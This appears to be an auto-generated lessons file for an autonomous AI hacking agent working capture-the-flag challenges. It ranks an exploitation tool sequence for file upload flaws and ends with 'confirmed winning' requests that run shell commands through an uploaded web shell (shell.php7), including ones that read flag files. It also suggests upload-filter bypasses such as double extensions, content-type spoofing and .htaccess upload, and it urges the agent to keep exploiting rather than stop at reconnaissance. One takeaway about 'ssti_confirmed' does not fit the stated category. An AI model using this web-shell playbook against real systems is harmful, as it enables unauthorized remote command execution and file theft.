# Consolidated Lessons: File Upload Vulnerabilities

> **Auto-generated:** 2026-05-04 04:14:37 UTC
> **Category:** File Upload Vulnerabilities
> **Type:** consolidated_lessons (3 docs — 2 success, 1 failure)
> **Tags:** `consolidated, file_upload_vulnerabilities, lessons, high-priority, wisdom`

> **Agent Note:** This consolidates patterns from multiple runs on this category.
> Use the Quick Exploitation Path as your primary action guide.

---

## Coverage

- **Total atomic rule docs:** 3
- **Success runs:** 2
- **Failure/partial runs:** 1

## Best Exploitation Path (from most recent success)

> **Note:** Replace `<TARGET_URL>` with the current challenge URL.

1. **`robots_txt`**: Check robots.txt for hidden paths
2. **`path_enumerator`**: Enumerate hidden paths and directories
3. **`deep_recon`**: Use `deep_recon`
4. **`file_upload`**: Use `file_upload`
5. **`http_fetch`**: Fetch the target URL to map the application and identify input forms — use: `{"url": "<TARGET_URL>uploads/shell.php7", "method": "GET", "params": {"cmd": "ls -la"}, "max_body": 4000}`
6. **`backup_file_finder`**: Look for exposed backup or config files

> **Next-step strategy:** Test double extensions (.php.jpg), content-type spoofing, and `.htaccess` upload to enable execution.

## Key Takeaways (ranked by frequency across runs)

1. Follow this winning tool sequence: robots_txt → path_enumerator → deep_recon → file_upload → http_fetch → backup_file_finder
2. Continue exploitation after confirming 'ssti_confirmed' — do not stop at reconnaissance
3. Pivot to a different attack vector early rather than repeating the same approach with minor variations

## Confirmed Winning Inputs

These exact requests produced the flag:

- `http_fetch` input: {"url": "http://61t71yr0.chals.mctf.io/uploads/shell.php7", "method": "GET", "params": {"cmd": "ls -la"}, "max_body": 4000}
- `http_fetch` input: {"url": "http://61t71yr0.chals.mctf.io/uploads/shell.php7", "method": "GET", "params": {"cmd": "cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || ls -la / && find / -maxdepth 3 -name '*flag*' 2>/dev/null | head"}, "max_body": 4000}
